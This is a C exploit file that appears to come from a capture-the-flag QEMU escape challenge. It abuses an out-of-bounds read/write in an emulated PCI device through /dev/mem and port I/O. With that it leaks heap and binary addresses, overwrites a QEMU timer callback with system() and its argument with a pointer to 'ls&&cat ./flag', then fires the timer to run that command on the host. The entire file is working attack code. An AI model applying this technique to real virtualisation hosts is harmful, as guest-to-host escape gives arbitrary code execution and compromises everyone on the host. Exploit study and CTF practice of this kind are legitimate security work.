/* Author: raycp
 * File: exp.c
 * Description: out-of-boud read-write vuln, with using qemu timer struct to control rip
 * Date: 2019-08-24
 */

#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>


uint32_t mmio_addr = 0xfebd6000;
uint32_t mmio_size = 0x1000;
uint32_t cmb_addr = 0xfebd0000;
uint32_t cmb_size = 0x4000;

unsigned char* mmio_mem;
unsigned char* cmb_mem;
uint32_t pmio_base=0x230;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void* mem_map( const char* dev, size_t offset, size_t size )
{
    int fd = open( dev, O_RDWR | O_SYNC );
    if ( fd == -1 ) {
        return 0;
    }

    void* result = mmap( NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset );

    if ( !result ) {
        return 0;
    }

    close( fd );
    return result;
}

uint8_t mmio_read(uint32_t addr)
{
    return *((uint8_t*) (mmio_mem+addr));
}

void mmio_write(uint32_t addr, uint8_t value)
{
    *( (uint32_t *) (mmio_mem+addr) ) = value;
}


uint8_t cmb_read(uint32_t addr)
{
    return *((uint8_t*) (cmb_mem+addr));
}

void cmb_write(uint32_t addr, uint8_t value)
{
    *( (uint8_t *) (cmb_mem+addr) ) = value;
}

void pmio_write(uint32_t addr, uint32_t value)
{
    outb(value,addr);
}


uint8_t pmio_read(uint32_t addr)
{
    return (uint32_t)inb(addr);
}

void set_offset(uint32_t value)
{
    pmio_write(pmio_base+0x10, value);
}

void set_memorymode(uint32_t value)
{
    pmio_write(pmio_base+0x0, value);
}

uint8_t arbitrary_read(uint32_t offset)
{

    set_offset(offset);
    return cmb_read(0x100);
}

void arbitrary_write(uint32_t offset, uint8_t value)
{
    set_offset(offset);
    cmb_write(0x100, value);
}

void normal_write(uint32_t offset, uint8_t value)
{
    set_offset(offset);
    cmb_write(0x0, value);
}

int main(int argc, char *argv[])
{
    //step 1 mmap /dev/mem to system, (man mem) to see the detail
    system( "mknod -m 660 /dev/mem c 1 1" );

    //step2 map the address to fd
    mmio_mem = mem_map( "/dev/mem", mmio_addr, mmio_size );
    if ( !mmio_mem ) {
        die("mmap mmio failed");
    }
    
    cmb_mem = mem_map( "/dev/mem", cmb_addr, cmb_size );
    if ( !cmb_mem ) {
        die("mmap cmb mem failed");
    }
    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 )
        die("I/O permission is not enough");

    //step3 set memorymode to 1
    set_memorymode(1);

    //step4 leak heapp address and pro address
    uint64_t heap_addr=0,tmp;
    uint32_t i;
    for (i=0;i<8;i++) {
        tmp = arbitrary_read(0x40+i);
        heap_addr=heap_addr+(tmp<<(i*8));
    }
    printf("leaking heap address: 0x%lx\n",heap_addr);

    uint64_t pro_addr=0;
    for (i=0;i<8;i++) {
        tmp = arbitrary_read(0x38+i);
        pro_addr=pro_addr+(tmp<<(i*8));
    }
    printf("leaking pro address: 0x%lx\n",pro_addr);

    uint64_t pro_base= pro_addr-0x4DCF10;
    uint64_t system_plt=pro_base+0x2AB860;
    //step5 write parameter to req_buf
    char *para="ls&&cat ./flag";
    for(i=0; i< strlen(para); i++) {
        normal_write(0x0+i,para[i]);
    }

    //step6 overwrite cb to system plt and opaque to para address
    uint64_t para_addr=heap_addr+0xb90;
    for(i=0; i<8; i++) {
        arbitrary_write(0x38+i,((char*)&system_plt)[i]);
    }

    for(i=0; i<8; i++) {
        arbitrary_write(0x40+i, ((char*)&para_addr)[i]);
    }
    
    //step7 trigger timer
    mmio_write(0x98,1);

}

